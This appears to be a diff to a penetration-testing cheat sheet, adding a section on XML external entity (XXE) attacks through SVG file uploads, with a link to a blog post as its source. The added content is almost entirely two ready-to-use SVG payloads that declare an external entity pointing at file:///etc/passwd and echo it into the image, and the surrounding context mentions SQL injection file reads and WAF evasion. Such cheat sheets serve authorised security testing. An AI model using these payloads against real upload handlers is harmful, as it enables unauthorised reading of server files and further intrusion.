@@ -1564,3 +1564,23 @@ SSRF
 7)Accessing system files with load_file(). and advance exploitation afterwards.
 WAF evasion if any.
 ```
+
+
+
+
+
+
+#### XXE File Upload SVG
+
+```powershell
+#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+
+```
+
+
